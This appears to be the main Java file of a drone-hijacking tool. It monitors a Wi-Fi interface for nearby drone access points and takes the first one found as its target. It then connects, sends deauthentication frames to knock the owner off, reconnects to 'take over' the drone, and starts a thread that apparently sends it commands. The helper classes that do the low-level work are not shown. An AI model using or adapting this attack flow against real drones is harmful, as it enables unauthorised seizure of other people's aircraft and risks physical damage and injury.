import drone.SendThread;
import networking.Networking;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Set;

public class Main {

    public static void main(String[] args) throws InterruptedException, UnknownHostException, IOException {
        /*

        ApiContextInitializer.init();
        TelegramBotsApi botsApi = new TelegramBotsApi();
        try {
            botsApi.registerBot(new MyAmazingBot());
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }

         */


        // make sure arp-scan is installed!!!

        String ifName_managed = args[0];
        String ifName_monitor = args[1];
        String essid = "";

        System.out.println("Using [" + ifName_managed + "] as managed-interface");
        System.out.println("Using [" + ifName_monitor + "] as monitor-interface");

        System.out.println("Scanning for incoming Drones ...");
        Thread networkRefresher = Networking.startWIFIMonitor(ifName_managed);
        while(essid.equals("")){
            Set<String> ids = Networking.getWifiAP();
            if(ids.isEmpty()) continue;
            essid = ids.iterator().next();
        }
        Networking.stopWIFIMonitor(networkRefresher, ifName_managed);
        System.out.println("Target identified ...");

        System.out.println("Aquiring target ...");
        Networking.connect(ifName_managed, ifName_monitor, essid);
        System.out.println("Deauthenticating ...");
        Networking.deauth(ifName_monitor, essid);
        System.out.println("Taking over tartget ...");
        String ap = Networking.connect(ifName_managed, ifName_monitor, essid);

        Thread t = new SendThread(InetAddress.getByName(ap));
        t.start();
    }
}
